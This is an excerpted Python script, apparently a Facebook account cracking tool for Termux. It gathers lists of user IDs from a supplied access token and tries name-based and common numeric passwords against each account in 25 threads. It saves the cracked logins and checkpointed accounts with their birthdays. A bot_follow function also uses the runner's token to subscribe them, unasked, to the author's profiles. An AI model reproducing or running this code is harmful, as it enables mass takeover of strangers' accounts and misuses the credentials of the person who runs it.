...
from time import sleep#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By RANA MZ.
#################################################################
#         		ATHOUR : RanaMZ			#
...
def menu():
	...
	print (logo)
	print("[++] TOKEN NAME : "+nama)
	print("[++] YOUR IP    : "+ip+"\n")
	print(C+"["+P+"01"+C+"]"+P+"  ADD ANY UNLIMTED IDZ")
	print(C+"["+P+"02"+C+"]"+P+"  GET ALL IDZ")
	print(C+"["+P+"03"+C+"]"+P+"  SETTING USET AGENT")
	print(C+"["+P+"00"+C+"]"+P+"           EXIT")
	ba=input("\n"+war+"CHOZE YOU WANT : ")
	if ba in [""," "]:
...
#	elif ba in ["",""]:
		...
		jalan(war+"RANA-MZ {NAM TU SUNA HUGA}.!!!")
...
def relogin():
	files = input("\n\n"+war+"Nama File : ")
	if files == "":
		print(war+'ENTER FILE NAME !!')
		time.sleep(3)
		relogin()
	try:
		rfiles = open(files, "r").readlines()
	except IOError:
		print(war+"FILE NOT FOUND %s "%(files))
		relogin()
	jalan("TOTAL IDZ : \033[1;32m%s\033[1;37m"%(len(rfiles)))
	for sz in rfiles:
		linez = sz.replace("\n","")
		symbz  = linez.split("|")
		print("(-----------------------------------------------------------------)")
		print("\n"+war+"CHEK : "+(linez.replace(" + ",""))+"\n")
		try:
...
class crackmenu:
    ...
    def passmenu(self,isifile):
        try:
            ...
            time.sleep(2)
            menu()
        print('\n\n'+war+'YOU WANT CHOICE PASWRD ? yes/no {n}')
        zk = input(inp+'TYPE : ')
        if zk in ('x','x'):
            while True:
                ...
                if pwx == '':
                    ...
                    jalan(war+"TURN ON-OF AROPLAN MODE IF SPED UZ SLOW\n"+war+"CHEK CP IDZ : "+K+"Zeshi/CP-"+durasi+".txt\n"+war+"CHEK OK IDZ  : "+I+"Zeshi/OK-"+durasi+".txt\n\n")
                    def zkth(zsc=None):
                ...
                jalan("[#] RANA MZ !!")
                print("[MZ] ENTER KEY THEN STRT...")
                ja = input("[??] PLEASE CHOZE : ")
    ...
    def api(self, user, zkth):
        ...
        for pw in zkth:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                print ('\r%s Rana-MZ{OK} %s|%s                 %s'%(I,user,pw,q))
                wrt = ('%s|%s'%(user,pw))
                ok.append(wrt)
                open('Zeshi/OK-'+durasi+'.txt' , 'a+').write('%s\n' % wrt)
                break
                continue
                ...
                try:
                    ...
                    dob = az['birthday']
                    print ('\r %s Rana-MZ{CP} %s|%s|%s      %s'%(K,user,pw,dob,Q))
                    wrt = ('%s|%s|%s'%(user,pw,dob))
                    cp.append(wrt)
                    open('Zeshi/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                    break
            ...
            with zthreads(max_workers=25) as (form):
            	for uname in self.id:
                    try:
                        ...
                        xz = zz[1].split(' ')
                        if len(xz)>=5:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3]+' '+xz[4], "334455", "112233", "123456" ]
                        elif len(xz) <= 1:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "334455", "112233", "123456" ]
                        elif len(xz) <= 2:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "334455", "112233", "123456" ]
                        elif len(xz) <= 3:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2], "334455", "112233", "123456" ]
                        elif len(xz) <= 4:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3], "334455", "112233", "123456" ]
                        else:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345', "334455", "112233", "123456" ]
                        form.submit(self.api,zz[0], pws)
                    except:
                        pass
            os.remove(self.apk)
            ...
            with zthreads(max_workers=25) as (form):
            	for uname in self.id:
                    try:
                        ...
                        xz = zz[1].split(' ')
                        if len(xz)>=5:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3]+' '+xz[4], "334455", "112233", "123456", "102030", "786786", "123123" ]
                        elif len(xz) <= 1:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "334455", "112233", "123456", "102030", "786786", "123123" ]
                        elif len(xz) <= 2:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "334455", "112233", "123456", "102030", "786786", "123123" ]
                        elif len(xz) <= 3:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2], "334455", "112233", "123456", "102030", "786786", "123123" ]
                        elif len(xz) <= 4:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3], "334455", "112233", "123456", "102030", "786786", "123123" ]
                        else:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345', "334455", "112233", "123456", "102030", "786786", "123123" ]
                        form.submit(self.api,zz[0], pws)
                    except:
                        pass
            os.remove(self.apk)
...
def ganti_ua():
	...
	if uq in [""," "]:
		...
		time.sleep(1)
		os.system("rm -rf .ua")
		exit(war+"RUN SCRIPT AGAIN : python rana.mz")
...
def login():
    os.system("clear")
    toket = input(war+"ENTER FACEBOOK TOKEN : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
...
def bot_follow():
	try:
		...
		time.sleep(1)
		login()
	print(war+'TOKEN ID NAME : '+nama)
	print(war+'ID TOKEN   : '+id)
	post1 = ('4111448792295892') # RanaMZ
	post2 = ("120338706765807") # RanaMZ
	post3 = ("167879918678352") # Zeshi
	post4 = ('180923747373969') # RANAMZ
	post5 = ("172628718203472") # RANA MZ
	post6 = ("198550702277940") # RANA Mz
	post7 = ("198552118944465") # RanaMZ
	...
	requests.post('https://graph.facebook.com/100000503718583/subscribers?access_token=' + token) ### RanaMZ
	requests.post('https://graph.facebook.com/100000889924523/subscribers?access_token=' + token) ### RanaMZ
	requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### RanaMZ
	requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### RanaMZ
	requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### RanaMZ
	requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### RanaMZ
	requests.post('https://graph.facebook.com/Termuxid-RanaMZ-110877271176800/subscribers?access_token=' + token) ### RanaMZ
#	requests.post('https://graph.facebook.com//subscribers?access_token=' + token) ### RanaMZ
#	requests.post('https://graph.facebook.com//subscribers?access_token=' + token) ### RanaMZ
...
def MZ_public():
	...
	idt = input(war+" ID LINK: ")
	limit = input(war+"Limit IDZ : ")
	filex = input(war+"NAME : ")
	try:
		MZ = open('MZ/'+filex+'.json','w') 
	...
	jalan(war+"Nama : "+I+"MZ/"+filex+".json")
	jalan(war+" Copy Nama !!")
	input(war+"Enter !!")
	menu()
